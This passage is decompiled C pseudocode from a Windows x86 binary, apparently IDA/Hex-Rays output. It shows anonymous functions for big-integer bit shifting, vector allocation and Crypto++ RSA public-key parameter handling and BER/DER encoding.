    dword_490C64 = (int)sub_40FFD9;
    dword_490C68 = (int)sub_410085;
    dword_490C88 = (int)sub_4108A7;
    dword_490C8C = (int)sub_410A44;
    dword_490CB0 = (int)sub_410497;
  }
  return result;
}
// 48C064: using guessed type int (__stdcall *off_48C064)(_DWORD, _DWORD);
// 48C068: using guessed type int (__fastcall *off_48C068)(_DWORD, _DWORD, _DWORD, _DWORD);
// 48C06C: using guessed type int dword_48C06C;
// 490C3C: using guessed type int dword_490C3C[];
// 490C40: using guessed type int dword_490C40;
// 490C44: using guessed type int dword_490C44;
// 490C4C: using guessed type int dword_490C4C;
// 490C5C: using guessed type int dword_490C5C;
// 490C60: using guessed type int (__cdecl *dword_490C60)(_DWORD, _DWORD, _DWORD);
// 490C64: using guessed type int dword_490C64;
// 490C68: using guessed type int dword_490C68;
// 490C70: using guessed type int dword_490C70;
// 490C80: using guessed type int dword_490C80;
// 490C84: using guessed type int dword_490C84[];
// 490C88: using guessed type int dword_490C88;
// 490C8C: using guessed type int dword_490C8C;
// 490C94: using guessed type int dword_490C94;
// 490CA4: using guessed type int dword_490CA4;
// 490CA8: using guessed type int dword_490CA8[];
// 490CAC: using guessed type int dword_490CAC;
// 490CB0: using guessed type int dword_490CB0;
// 490CB8: using guessed type int dword_490CB8;
// 490CC8: using guessed type int dword_490CC8;

//----- (0041C142) --------------------------------------------------------
unsigned int __cdecl sub_41C142(int a1, unsigned int a2, int a3)
{
  unsigned int v3; // esi
  unsigned int i; // ebp
  int v5; // eax
  unsigned int v6; // esi

  v3 = 0;
  if ( a3 )
  {
    for ( i = 0; i < a2; ++i )
    {
      v5 = v3 | (*(_DWORD *)(a1 + 4 * i) << a3);
      v6 = *(_DWORD *)(a1 + 4 * i);
      *(_DWORD *)(a1 + 4 * i) = v5;
      v3 = v6 >> (32 - a3);
    }
  }
  return v3;
}

//----- (0041C187) --------------------------------------------------------
int __cdecl sub_41C187(_DWORD *a1, unsigned int a2, unsigned int a3)
{
  unsigned int v3; // ecx
  unsigned int v4; // edx
  int *v5; // esi
  int v6; // eax
  int result; // eax

  v3 = a3;
  if ( a2 < a3 )
    v3 = a2;
  if ( v3 )
  {
    v4 = a2 - 1;
    if ( a2 - 1 >= v3 )
    {
      v5 = &a1[v4 - v3];
      do
      {
        v6 = *v5--;
        a1[v4--] = v6;
      }
      while ( v4 >= v3 );
    }
    result = 0;
    memset(a1, 0, 4 * v3);
  }
  return result;
}
// 41C1BA: conditional instruction was optimized away because ecx.4!=0

//----- (0041C1C2) --------------------------------------------------------
int __cdecl sub_41C1C2(int a1, int a2, int a3)
{
  int v3; // edi
  int v4; // esi
  int *v5; // eax
  int v6; // edx
  int *v8; // [esp+4h] [ebp-4h]

  v3 = 0;
  if ( a3 )
  {
    v4 = a2;
    if ( a2 )
    {
      v5 = (int *)(a1 + 4 * a2 - 4);
      v8 = v5;
      do
      {
        v6 = *v5;
        *v8 = v3 | ((unsigned int)*v5 >> a3);
        v5 = v8 - 1;
        v3 = v6 << (32 - a3);
        --v8;
        --v4;
      }
      while ( v4 );
    }
  }
  return v3;
}

//----- (0041C21A) --------------------------------------------------------
int __cdecl sub_41C21A(_DWORD *a1, unsigned int a2, unsigned int a3)
{
  unsigned int v3; // ecx
  unsigned int v4; // edi
  _DWORD *v5; // ebp
  _DWORD *v6; // ebx
  int result; // eax

  v3 = a3;
  if ( a2 < a3 )
    v3 = a2;
  if ( v3 )
  {
    if ( v3 < a2 )
    {
      v4 = v3;
      v5 = &a1[v3];
      v6 = a1;
      do
      {
        ++v4;
        *v6++ = *v5++;
      }
      while ( v4 < a2 );
    }
    result = 0;
    memset(&a1[a2 - v3], 0, 4 * v3);
  }
  return result;
}
// 41C257: conditional instruction was optimized away because ecx.4!=0

//----- (0041C260) --------------------------------------------------------
void __thiscall sub_41C260(_DWORD *this, int a2, int *a3, int *a4, unsigned int a5)
{
  int v6; // edi
  int *v7; // eax
  unsigned int v8; // edi
  int v9; // esi
  int *v10; // eax
  int v11[31]; // [esp+10h] [ebp-A0h] BYREF
  int v12; // [esp+8Ch] [ebp-24h] BYREF
  char v13[28]; // [esp+90h] [ebp-20h] BYREF
  int v14; // [esp+ACh] [ebp-4h]

  v6 = (int)(this + 3);
  if ( sub_411C2A(this + 3, 0) == 1 )
  {
    sub_40EA62((int)v11, v6);
    v14 = 0;
    v7 = sub_4112E3(v11, &v12, a3);
    v8 = a5;
    v9 = a2;
    LOBYTE(v14) = 1;
    sub_42621A(v11, a2, v7, a4, a5);
    LOBYTE(v14) = 0;
    sub_40891D((int)v13);
    if ( a5 )
    {
      do
      {
        v10 = (int *)sub_41134B(v11, &v12, v9);
        LOBYTE(v14) = 2;
        sub_40EC6C(v9, v10);
        LOBYTE(v14) = 0;
        sub_40891D((int)v13);
        v9 += 24;
        --v8;
      }
      while ( v8 );
    }
    sub_40EC4B(v11);
  }
  else
  {
    sub_42621A(this, a2, a3, a4, a5);
  }
}
// 41C260: using guessed type int var_A0[31];

//----- (0041C32D) --------------------------------------------------------
int __thiscall sub_41C32D(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[1] + 84))(this[1]);
}

//----- (0041C335) --------------------------------------------------------
int __thiscall sub_41C335(void *this, void *a2)
{
  int *v3; // eax
  int v4; // esi
  int v6; // [esp+10h] [ebp-24h] BYREF
  char v7[28]; // [esp+14h] [ebp-20h] BYREF
  int v8; // [esp+30h] [ebp-4h]

  v3 = sub_41C444(a2, &v6);
  v8 = 0;
  v4 = sub_40EC6C((int)this + 36, v3);
  sub_40891D((int)v7);
  return v4;
}
// 41C335: using guessed type char var_20[28];

//----- (0041C370) --------------------------------------------------------
int __thiscall sub_41C370(int *this, void *a2)
{
  int *v3; // eax
  int *v4; // eax
  int v5; // esi
  int v7; // [esp+10h] [ebp-3Ch] BYREF
  char v8[20]; // [esp+14h] [ebp-38h] BYREF
  int v9; // [esp+28h] [ebp-24h] BYREF
  char v10[28]; // [esp+2Ch] [ebp-20h] BYREF
  int v11; // [esp+48h] [ebp-4h]

  v3 = sub_41C444(a2, &v7);
  v11 = 0;
  v4 = sub_40EEA2(&v9, v3, this + 3);
  LOBYTE(v11) = 1;
  v5 = sub_40EC6C((int)(this + 15), v4);
  sub_40891D((int)v10);
  sub_40891D((int)v8);
  return v5;
}
// 41C370: using guessed type char var_20[28];
// 41C370: using guessed type char var_38[20];

//----- (0041C3C8) --------------------------------------------------------
_DWORD *__thiscall sub_41C3C8(_DWORD *this, int a2)
{
  int v3; // edi
  int v4; // ebp
  int v5; // eax
  void *Destination; // [esp+14h] [ebp-4h]

  v3 = this[6];
  v4 = this[30];
  Destination = (void *)this[13];
  sub_4130D8(v4, v4 + 8 * v3, *(_DWORD *)(a2 + 16), *(_DWORD *)(a2 + 12));
  v5 = *(_DWORD *)(a2 + 12);
  if ( 2 * (v3 - v5) )
    memset((void *)(v4 + 8 * v5), 0, 8 * (v3 - v5));
  sub_4122FF(Destination, v4 + 8 * v3, v4, this[7], this[25], v3);
  return this + 9;
}

//----- (0041C444) --------------------------------------------------------
int *__thiscall sub_41C444(void *this, int *a2)
{
  sub_41C537(this, a2, (int)this);
  return a2;
}

//----- (0041C45E) --------------------------------------------------------
int __thiscall sub_41C45E(void *this, _DWORD *a2, int a3)
{
  int *v4; // eax
  int v5; // esi
  int v7; // [esp+10h] [ebp-24h] BYREF
  char v8[28]; // [esp+14h] [ebp-20h] BYREF
  int v9; // [esp+30h] [ebp-4h]

  v4 = sub_40EDC8(&v7, a2, a3);
  v9 = 0;
  v5 = sub_40EC6C((int)this + 36, v4);
  sub_40891D((int)v8);
  return v5;
}
// 41C45E: using guessed type char var_20[28];

//----- (0041C49F) --------------------------------------------------------
_DWORD *__thiscall sub_41C49F(_DWORD *this, _DWORD *a2, int a3)
{
  int v4; // ecx
  int *v6; // eax
  int v7; // [esp+10h] [ebp-24h] BYREF
  char v8[28]; // [esp+14h] [ebp-20h] BYREF
  int v9; // [esp+30h] [ebp-4h]

  v4 = this[6];
  if ( a2[3] == v4 && *(_DWORD *)(a3 + 12) == v4 )
  {
    if ( off_48C068(a2[3], this[13], a2[4], *(_DWORD *)(a3 + 16)) )
      off_48C064(this[13], this[7]);
    return this + 9;
  }
  else
  {
    v6 = sub_40EDC8(&v7, a2, a3);
    v9 = 0;
    sub_40EC6C((int)(this + 15), v6);
    v9 = -1;
    sub_40891D((int)v8);
    if ( this[20] == 1 )
      sub_40EF1C(this + 15, (int)(this + 3));
    return this + 15;
  }
}
// 48C064: using guessed type int (__stdcall *off_48C064)(_DWORD, _DWORD);
// 48C068: using guessed type int (__fastcall *off_48C068)(_DWORD, _DWORD, _DWORD, _DWORD);
// 41C49F: using guessed type char var_20[28];

//----- (0041C52F) --------------------------------------------------------
int __thiscall sub_41C52F(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[1] + 72))(this[1]);
}

//----- (0041C537) --------------------------------------------------------
int *__thiscall sub_41C537(void *this, int *a2, int a3)
{
  sub_40E940(a2);
  sub_412551(a2, (int)this, a3);
  return a2;
}

//----- (0041C57A) --------------------------------------------------------
unsigned int __cdecl sub_41C57A(unsigned int *a1, unsigned int a2)
{
  unsigned int result; // eax

  sub_4115F5(a1, a2, 1);
  for ( result = 0; result < a2; ++result )
    a1[result] = ~a1[result];
  return result;
}

//----- (0041C5A2) --------------------------------------------------------
int __thiscall sub_41C5A2(int *this)
{
  return sub_4113F2(this[4], this[3]);
}

//----- (0041C5B0) --------------------------------------------------------
_DWORD *sub_41C5B0()
{
  _DWORD *result; // eax
  int v1; // esi

  if ( dword_490CD4 > *(_DWORD *)(*((_DWORD *)NtCurrentTeb()->ThreadLocalStoragePointer + TlsIndex) + 4) )
  {
    _Init_thread_header(&dword_490CD4);
    if ( dword_490CD4 == -1 )
    {
      dword_490CD0 = 0;
      atexit(sub_469F49);
      _Init_thread_footer(&dword_490CD4);
    }
  }
  result = (_DWORD *)dword_490CD0;
  if ( !dword_490CD0 )
  {
    result = sub_40EEEE();
    v1 = dword_490CD0;
    if ( dword_490CD0 )
    {
      if ( result )
        (*(void (__thiscall **)(_DWORD *, int))*result)(result, 1);
      return (_DWORD *)v1;
    }
    else
    {
      dword_490CD0 = (int)result;
    }
  }
  return result;
}
// 42D09E: using guessed type _DWORD __cdecl _Init_thread_footer(_DWORD);
// 42D0E8: using guessed type _DWORD __cdecl _Init_thread_header(_DWORD);
// 490CD0: using guessed type int dword_490CD0;
// 490CD4: using guessed type int dword_490CD4;
// 492450: using guessed type int TlsIndex;

//----- (0041C5BD) --------------------------------------------------------
char __thiscall sub_41C5BD(_DWORD *this, unsigned int a2)
{
  char result; // al
  _DWORD *v4; // eax

  *this = 0;
  this[1] = 0;
  this[2] = 0;
  if ( !a2 )
    return 0;
  if ( a2 > 0x3FFFFFFF )
    sub_429710("vector<T> too long");
  v4 = sub_40B7DF(a2, 4u, 1);
  *this = v4;
  this[1] = v4;
  result = 1;
  this[2] = *this + 4 * a2;
  return result;
}

//----- (0041C60B) --------------------------------------------------------
char __thiscall sub_41C60B(_DWORD **this, unsigned int a2, _DWORD *a3)
{
  _DWORD *v4; // eax

  LOBYTE(v4) = sub_41C5BD(this, a2);
  if ( (_BYTE)v4 )
  {
    v4 = sub_41C658(*this, a2, a3);
    this[1] = v4;
  }
  return (char)v4;
}

//----- (0041C658) --------------------------------------------------------
_DWORD *__stdcall sub_41C658(_DWORD *a1, int a2, _DWORD *a3)
{
  sub_40E5BB(a1, a2, a3);
  return &a1[a2];
}

//----- (0041C67D) --------------------------------------------------------
_DWORD *__cdecl sub_41C67D(_DWORD *a1, int a2, int a3, int a4)
{
  _DWORD v5[25]; // [esp+10h] [ebp-64h] BYREF

  v5[21] = 0;
  sub_40E9C4(v5, a4);
  v5[24] = 0;
  sub_426016(v5, a1, a2, a3);
  sub_40EC29(v5);
  return a1;
}

//----- (0041C6BE) --------------------------------------------------------
int __stdcall sub_41C6BE(unsigned int a1, int a2)
{
  sub_411132(a1);
  if ( a1 )
    return sub_420B8E(4 * a1);
  else
    return 0;
}

//----- (0041C6E2) --------------------------------------------------------
void *__stdcall sub_41C6E2(unsigned int a1, int a2)
{
  sub_411132(a1);
  if ( a1 )
    return sub_420BF0(4 * a1);
  else
    return 0;
}

//----- (0041C706) --------------------------------------------------------
_DWORD *__cdecl sub_41C706(_DWORD *a1)
{
  sub_40EB0B(a1, 1);
  return a1;
}

//----- (0041C71F) --------------------------------------------------------
_DWORD *__cdecl sub_41C71F(_DWORD *a1)
{
  _DWORD *v1; // eax
  void **v3; // [esp+14h] [ebp-20h] BYREF
  char v4[12]; // [esp+18h] [ebp-1Ch] BYREF
  int v5; // [esp+24h] [ebp-10h]
  int v6; // [esp+30h] [ebp-4h]

  v5 = 0;
  v1 = sub_41C767(&v3);
  v6 = 0;
  sub_40EE24(a1, (int)v1, 840);
  v3 = &CryptoPP::OID::`vftable';
  sub_40BB4F((int)v4);
  return a1;
}
// 46B594: using guessed type void *CryptoPP::OID::`vftable';
// 41C71F: using guessed type char var_1C[12];

//----- (0041C767) --------------------------------------------------------
_DWORD *__cdecl sub_41C767(_DWORD *a1)
{
  _DWORD *v1; // eax
  void **v3; // [esp+10h] [ebp-20h] BYREF
  char v4[12]; // [esp+14h] [ebp-1Ch] BYREF
  int v5; // [esp+20h] [ebp-10h]
  int v6; // [esp+2Ch] [ebp-4h]

  v5 = 0;
  v1 = sub_41C706(&v3);
  v6 = 0;
  sub_40EE24(a1, (int)v1, 2);
  v3 = &CryptoPP::OID::`vftable';
  sub_40BB4F((int)v4);
  return a1;
}
// 46B594: using guessed type void *CryptoPP::OID::`vftable';
// 41C767: using guessed type char var_1C[12];

//----- (0041C829) --------------------------------------------------------
_DWORD *__thiscall sub_41C829(_DWORD *this, char *a2, void (__thiscall *a3)(int, int *), int a4, int a5)
{
  int v6; // ecx
  char *v7; // eax
  _BYTE **v8; // eax
  _BYTE **v9; // eax
  _BYTE **v10; // eax
  _DWORD *v11; // eax
  int v13; // [esp+10h] [ebp-B0h] BYREF
  char v14[20]; // [esp+14h] [ebp-ACh] BYREF
  char v15[24]; // [esp+28h] [ebp-98h] BYREF
  char v16[24]; // [esp+40h] [ebp-80h] BYREF
  char v17[24]; // [esp+58h] [ebp-68h] BYREF
  char v18[24]; // [esp+70h] [ebp-50h] BYREF
  int pExceptionObject[13]; // [esp+88h] [ebp-38h] BYREF
  int v20; // [esp+BCh] [ebp-4h]

  if ( !*((_BYTE *)this + 8) )
  {
    sub_40E940(&v13);
    v6 = this[1];
    v20 = 0;
    if ( !(*(unsigned __int8 (__thiscall **)(int, char *, void *, int *))(*(_DWORD *)v6 + 4))(
            v6,
            a2,
            &CryptoPP::Integer `RTTI Type Descriptor',
            &v13) )
    {
      v7 = (char *)__std_type_info_name((int)&dword_48FCD8, &stru_492448);
      v8 = (_BYTE **)sub_40AAE3((int)v18, v7);
      LOBYTE(v20) = 1;
      v9 = (_BYTE **)sub_40BEFB((int)v17, v8, ": Missing required parameter '");
      LOBYTE(v20) = 2;
      v10 = (_BYTE **)sub_40BEFB((int)v16, v9, a2);
      LOBYTE(v20) = 3;
      v11 = (_DWORD *)sub_40BEFB((int)v15, v10, "'");
      LOBYTE(v20) = 4;
      sub_406307(pExceptionObject, 1, v11);
      pExceptionObject[0] = (int)&CryptoPP::InvalidArgument::`vftable';
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
    }
    a3(*this + *(_DWORD *)(*(_DWORD *)(*this + 8) + a5) + a4 + 8, &v13);
    sub_40891D((int)v14);
  }
  return this;
}
// 46B464: using guessed type void *CryptoPP::InvalidArgument::`vftable';
// 48FCD8: using guessed type int dword_48FCD8;
// 41C829: using guessed type char var_50[24];
// 41C829: using guessed type char var_68[24];
// 41C829: using guessed type char var_80[24];
// 41C829: using guessed type char var_98[24];
// 41C829: using guessed type char var_AC[20];

//----- (0041C91C) --------------------------------------------------------
void *__thiscall sub_41C91C(void *this, char *Src, int (__thiscall *a3)(int), int a4, int a5)
{
  unsigned int v6; // eax
  int v7; // edx
  const void **v8; // esi
  unsigned int v9; // eax
  int v10; // edx
  int v11; // eax
  int *v12; // eax

  if ( *((_BYTE *)this + 17) )
  {
    v6 = sub_40BC7D(Src);
    v8 = sub_40C68E(*((_BYTE ***)this + 3), v7, Src, v6);
    v9 = sub_40BC7D(";");
    sub_40C68E((_BYTE **)v8, v10, ";", v9);
  }
  if ( !*((_BYTE *)this + 16) )
  {
    v11 = strcmp(Src, *((const char **)this + 1));
    if ( v11 )
      v11 = v11 < 0 ? -1 : 1;
    if ( !v11 )
    {
      sub_406577(Src, (char *)&CryptoPP::Integer `RTTI Type Descriptor', *((_DWORD *)this + 2));
      v12 = (int *)a3(a4 + 8 + *(_DWORD *)this + *(_DWORD *)(*(_DWORD *)(*(_DWORD *)this + 8) + a5));
      sub_40EC6C(*((_DWORD *)this + 3), v12);
      *((_BYTE *)this + 16) = 1;
    }
  }
  return this;
}
// 41C939: variable 'v7' is possibly undefined
// 41C950: variable 'v10' is possibly undefined

//----- (0041C9CF) --------------------------------------------------------
int *__cdecl sub_41C9CF(int *a1, int a2, void *a3)
{
  sub_41CA66(a1, a2, a3);
  return a1;
}

//----- (0041C9E5) --------------------------------------------------------
char __thiscall sub_41C9E5(void *this, int a2)
{
  _BYTE **v3; // esi
  char *v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // ecx
  bool v7; // cf
  char v8; // bl
  _DWORD v10[6]; // [esp+10h] [ebp-40h] BYREF
  _DWORD v11[9]; // [esp+28h] [ebp-28h] BYREF
  int v12; // [esp+4Ch] [ebp-4h]

  v3 = (_BYTE **)sub_40AAE3((int)v10, "ThisObject:");
  v12 = 0;
  v4 = (char *)__std_type_info_name((int)&dword_48FCD8, &stru_492448);
  v5 = (_DWORD *)sub_40BEFB((int)v11, v3, v4);
  v6 = v5;
  v7 = v5[5] < 0x10u;
  LOBYTE(v12) = 1;
  if ( !v7 )
    v6 = (_DWORD *)*v5;
  v8 = (*(int (__thiscall **)(void *, _DWORD *, void *, int))(*(_DWORD *)this + 4))(
         this,
         v6,
         &CryptoPP::RSAFunction `RTTI Type Descriptor',
         a2);
  sub_40BAFC(v11, 1, 0);
  sub_40BAFC(v10, 1, 0);
  return v8;
}
// 48FCD8: using guessed type int dword_48FCD8;
// 41C9E5: using guessed type _DWORD var_40[6];
// 41C9E5: using guessed type _DWORD var_28[9];

//----- (0041CA66) --------------------------------------------------------
int *__thiscall sub_41CA66(int *this, int a2, void *a3)
{
  *this = a2;
  this[1] = (int)a3;
  *((_BYTE *)this + 8) = 0;
  if ( sub_41C9E5(a3, a2) )
  {
    *((_BYTE *)this + 8) = 1;
  }
  else if ( __std_type_info_compare(&dword_48FCD8, &dword_48FCD8) )
  {
    sub_41CCCF((char *)(a2 + 60), (int)a3);
  }
  return this;
}
// 44416A: using guessed type _DWORD __cdecl __std_type_info_compare(_DWORD, _DWORD);
// 48FCD8: using guessed type int dword_48FCD8;

//----- (0041CAB1) --------------------------------------------------------
void *__thiscall sub_41CAB1(void *this, int a2, _BYTE *Src, int a4, int *a5, int a6)
{
  int v7; // ecx
  int v8; // esi
  int v9; // edi
  char *v10; // edi
  unsigned int v11; // eax
  int v12; // edx
  const void **v13; // esi
  unsigned int v14; // eax
  int v15; // edx
  void **v16; // eax
  int v17; // eax

  v7 = 0;
  v8 = a4;
  *(_DWORD *)this = a2;
  *((_DWORD *)this + 1) = Src;
  *((_DWORD *)this + 2) = a4;
  *((_DWORD *)this + 3) = a5;
  *((_WORD *)this + 8) = 0;
  while ( 1 )
  {
    v9 = a2;
    if ( Src[v7] != aValuenames[v7] )
      break;
    if ( ++v7 == 11 )
    {
      *((_WORD *)this + 8) = 257;
      sub_406577(Src, (char *)&std::string `RTTI Type Descriptor', a4);
      if ( a6 )
        (*(void (__thiscall **)(int, _DWORD, int, int *))(*(_DWORD *)a6 + 4))(a6, *((_DWORD *)this + 1), a4, a5);
      if ( __std_type_info_compare(&dword_48FCD8, &dword_48FCD8) )
        sub_41CEE9((void *)(a2 + 60), *((void **)this + 1), a4, a5);
      v10 = (char *)__std_type_info_name((int)&dword_48FCD8, &stru_492448);
      v11 = sub_40BC7D("ThisPointer:");
      v13 = sub_40C68E(*((_BYTE ***)this + 3), v12, "ThisPointer:", v11);
      v14 = sub_40BC7D(v10);
      v16 = (void **)sub_40C68E((_BYTE **)v13, v15, v10, v14);
      sub_401F9A(v16, 1u, 59);
      v8 = a4;
      v9 = a2;
      break;
    }
  }
  if ( !*((_BYTE *)this + 16) )
  {
    if ( strncmp(*((const char **)this + 1), "ThisPointer:", 0xCu) )
      goto LABEL_24;
    v17 = strcmp(
            (const char *)(*((_DWORD *)this + 1) + 12),
            (const char *)__std_type_info_name((int)&dword_48FCD8, &stru_492448));
    if ( v17 )
      v17 = v17 < 0 ? -1 : 1;
    if ( v17 )
    {
LABEL_24:
      if ( !*((_BYTE *)this + 16) )
      {
        if ( a6 )
          *((_BYTE *)this + 16) = (*(int (__thiscall **)(int, _DWORD, int, int *))(*(_DWORD *)a6 + 4))(
                                    a6,
                                    *((_DWORD *)this + 1),
                                    v8,
                                    a5);
        if ( !*((_BYTE *)this + 16) && __std_type_info_compare(&dword_48FCD8, &dword_48FCD8) )
          *((_BYTE *)this + 16) = sub_41CEE9((void *)(v9 + 60), *((void **)this + 1), v8, a5);
      }
    }
    else
    {
      sub_406577(*((void **)this + 1), (char *)&CryptoPP::RSAFunction * `RTTI Type Descriptor', *((_DWORD *)this + 2));
      *a5 = v9;
      *((_BYTE *)this + 16) = 1;
    }
  }
  return this;
}
// 41CB6E: variable 'v12' is possibly undefined
// 41CB80: variable 'v15' is possibly undefined
// 44416A: using guessed type _DWORD __cdecl __std_type_info_compare(_DWORD, _DWORD);
// 48D370: using guessed type void **std::string `RTTI Type Descriptor';
// 48D3BC: using guessed type struct CryptoPP::RSAFunction *CryptoPP::RSAFunction * `RTTI Type Descriptor';
// 48FCD8: using guessed type int dword_48FCD8;

//----- (0041CC5F) --------------------------------------------------------
void *__thiscall sub_41CC5F(void *this, int a2)
{
  sub_40EC6C((int)this + 12, (int *)(a2 + 12));
  sub_40EC6C((int)this + 36, (int *)(a2 + 36));
  return this;
}

//----- (0041CC86) --------------------------------------------------------
_DWORD *__thiscall sub_41CC86(_DWORD *this, _DWORD *a2, int a3)
{
  int v4; // edi
  int v5; // esi
  int *v6; // eax

  v4 = *(_DWORD *)(this[2] + 4);
  v5 = *(_DWORD *)((char *)this + v4 + 8);
  v6 = sub_40D6F4();
  (*(void (__thiscall **)(int, int *, _DWORD))(v5 + 16))((int)this + v4 + 8, v6, 0);
  sub_41C67D(a2, a3, (int)(this + 9), (int)(this + 3));
  return a2;
}

//----- (0041CCCF) --------------------------------------------------------
_DWORD *__thiscall sub_41CCCF(char *this, int a2)
{
  _DWORD *v2; // eax
  _DWORD *v3; // eax
  int v5[6]; // [esp+8h] [ebp-18h] BYREF

  v5[5] = 0;
  v5[2] = 0;
  v5[4] = -8;
  v5[3] = (int)sub_41CF6F;
  v5[1] = -8;
  v5[0] = (int)sub_41CF67;
  v2 = (_DWORD *)sub_41C9CF(v5, this - 60, a2);
  v3 = sub_41C829(v2, "Modulus", (void (__thiscall *)(int, int *))sub_41CF67, -8, 0);
  return sub_41C829(v3, "PublicExponent", (void (__thiscall *)(int, int *))sub_41CF6F, -8, 0);
}
// 41C9CF: using guessed type _DWORD __cdecl sub_41C9CF(_DWORD, _DWORD, _DWORD);
// 41CF6F: using guessed type int __stdcall sub_41CF6F(int);

//----- (0041CD3F) --------------------------------------------------------
int __thiscall sub_41CD3F(int this)
{
  char *v2; // edi
  unsigned int v3; // eax
  int v4; // edx
  const void **v5; // esi
  unsigned int v6; // eax
  int v7; // edx
  void **v8; // eax
  const char *v9; // eax
  char *v10; // esi
  int v11; // eax

  if ( *(_BYTE *)(this + 17) )
  {
    v2 = (char *)__std_type_info_name((int)&dword_48FCD8, &stru_492448);
    v3 = sub_40BC7D("ThisObject:");
    v5 = sub_40C68E(*(_BYTE ***)(this + 12), v4, "ThisObject:", v3);
    v6 = sub_40BC7D(v2);
    v8 = (void **)sub_40C68E((_BYTE **)v5, v7, v2, v6);
    sub_401F9A(v8, 1u, 59);
  }
  if ( !*(_BYTE *)(this + 16) && !strncmp(*(const char **)(this + 4), "ThisObject:", 0xBu) )
  {
    v9 = (const char *)__std_type_info_name((int)&dword_48FCD8, &stru_492448);
    v10 = *(char **)(this + 4);
    v11 = strcmp(v10 + 11, v9);
    if ( v11 )
      v11 = v11 < 0 ? -1 : 1;
    if ( !v11 )
    {
      sub_406577(v10, (char *)&CryptoPP::RSAFunction `RTTI Type Descriptor', *(_DWORD *)(this + 8));
      sub_41CC5F(*(void **)(this + 12), *(_DWORD *)this);
      *(_BYTE *)(this + 16) = 1;
    }
  }
  return this;
}
// 41CD6F: variable 'v4' is possibly undefined
// 41CD81: variable 'v7' is possibly undefined
// 48FCD8: using guessed type int dword_48FCD8;

//----- (0041CE0F) --------------------------------------------------------
int __thiscall sub_41CE0F(_DWORD *this, int a2, int a3, int a4)
{
  int v6[14]; // [esp+10h] [ebp-38h] BYREF

  sub_40AB80(v6, a2, 48);
  v6[0] = (int)&CryptoPP::BERSequenceDecoder::`vftable';
  v6[1] = (int)&CryptoPP::BERSequenceDecoder::`vftable';
  v6[13] = 0;
  (*(void (__thiscall **)(_DWORD *, int *))(this[2] + 4))(this + 2, v6);
  (*(void (__thiscall **)(_DWORD *, int *))(this[8] + 4))(this + 8, v6);
  sub_40B6AF((int)v6);
  return sub_40AC76(v6);
}
// 46B728: using guessed type void *CryptoPP::BERSequenceDecoder::`vftable';
// 46B7E0: using guessed type void *CryptoPP::BERSequenceDecoder::`vftable';

//----- (0041CE6D) --------------------------------------------------------
void __thiscall sub_41CE6D(_DWORD *this, int a2)
{
  int v3[16]; // [esp+10h] [ebp-40h] BYREF

  sub_40ABBB((int)v3, a2, 48);
  v3[0] = (int)&CryptoPP::DERSequenceEncoder::`vftable';
  v3[1] = (int)&CryptoPP::DERSequenceEncoder::`vftable';
  v3[15] = 0;
  (*(void (__thiscall **)(_DWORD *, int *))(this[2] + 8))(this + 2, v3);
  (*(void (__thiscall **)(_DWORD *, int *))(this[8] + 8))(this + 8, v3);
  sub_40B6EB((int)v3);
  sub_40ACD8((int)v3);
}
// 46B7F0: using guessed type void *CryptoPP::DERSequenceEncoder::`vftable';
// 46B8A4: using guessed type void *CryptoPP::DERSequenceEncoder::`vftable';

//----- (0041CECB) --------------------------------------------------------
_DWORD *__stdcall sub_41CECB(_DWORD *a1)
{
  sub_41D05A(a1);
  return a1;
}

//----- (0041CEE5) --------------------------------------------------------
char *__thiscall sub_41CEE5(char *this)
{
  return this + 36;
}

//----- (0041CEE9) --------------------------------------------------------
char __thiscall sub_41CEE9(void *this, void *Src, int a3, void *a4)
{
  void *v4; // eax
  void *v5; // eax
  char v7[20]; // [esp+8h] [ebp-2Ch] BYREF
  char *(__thiscall *v8)(char *); // [esp+1Ch] [ebp-18h]
  int v9; // [esp+20h] [ebp-14h]
  int v10; // [esp+24h] [ebp-10h]
  char *(__thiscall *v11)(char *); // [esp+28h] [ebp-Ch]
  int v12; // [esp+2Ch] [ebp-8h]
  int v13; // [esp+30h] [ebp-4h]

  v12 = -8;
  v9 = -8;
  v11 = sub_41CEE5;
  v13 = 0;
  v8 = sub_40836A;
  v10 = 0;
  sub_41CAB1((int)this - 60, Src, a3, a4, 0);
  v4 = (void *)sub_41CD3F((int)v7);
  v5 = sub_41C91C(v4, "Modulus", (int (__thiscall *)(int))sub_40836A, -8, 0);
  return *((_BYTE *)sub_41C91C(v5, "PublicExponent", (int (__thiscall *)(int))sub_41CEE5, -8, 0) + 16);
}
// 41CEE9: using guessed type char var_2C[20];

//----- (0041CF67) --------------------------------------------------------
int __thiscall sub_41CF67(void *this, int *a2)
{
  return sub_40EC6C((int)this + 12, a2);
}

//----- (0041CF77) --------------------------------------------------------
bool __thiscall sub_41CF77(int *this, int a2, int a3)
{
  _DWORD *v4; // eax
  int v5; // edi
  char v6; // bl
  _DWORD *v7; // eax
  int *v8; // esi

  v4 = sub_4128E4();
  v5 = (int)(this - 12);
  v6 = 0;
  if ( sub_41128E(this - 12, (int)v4) > 0 && sub_411C2A(this - 12, 0) == 1 )
  {
    v7 = sub_4128E4();
    v8 = this - 6;
    if ( sub_41128E(v8, (int)v7) > 0 && sub_411C2A(v8, 0) == 1 )
      return sub_41128E(v8, v5) < 0;
  }
  return v6;
}

//----- (0041CFD4) --------------------------------------------------------
_DWORD *__cdecl sub_41CFD4(_DWORD *a1)
{
  _DWORD *v1; // eax
  void **v3; // [esp+10h] [ebp-20h] BYREF
  char v4[12]; // [esp+14h] [ebp-1Ch] BYREF
  int v5; // [esp+20h] [ebp-10h]
  int v6; // [esp+2Ch] [ebp-4h]

  v5 = 0;
  v1 = sub_41D09D(&v3);
  v6 = 0;
  sub_40EE24(a1, (int)v1, 1);
  v3 = &CryptoPP::OID::`vftable';
  sub_40BB4F((int)v4);
  return a1;
}
// 46B594: using guessed type void *CryptoPP::OID::`vftable';
// 41CFD4: using guessed type char var_1C[12];

//----- (0041D017) --------------------------------------------------------
_DWORD *__cdecl sub_41D017(_DWORD *a1)
{
  _DWORD *v1; // eax
  void **v3; // [esp+10h] [ebp-20h] BYREF
  char v4[12]; // [esp+14h] [ebp-1Ch] BYREF
  int v5; // [esp+20h] [ebp-10h]
  int v6; // [esp+2Ch] [ebp-4h]

  v5 = 0;
  v1 = sub_41CFD4(&v3);
  v6 = 0;
  sub_40EE24(a1, (int)v1, 1);
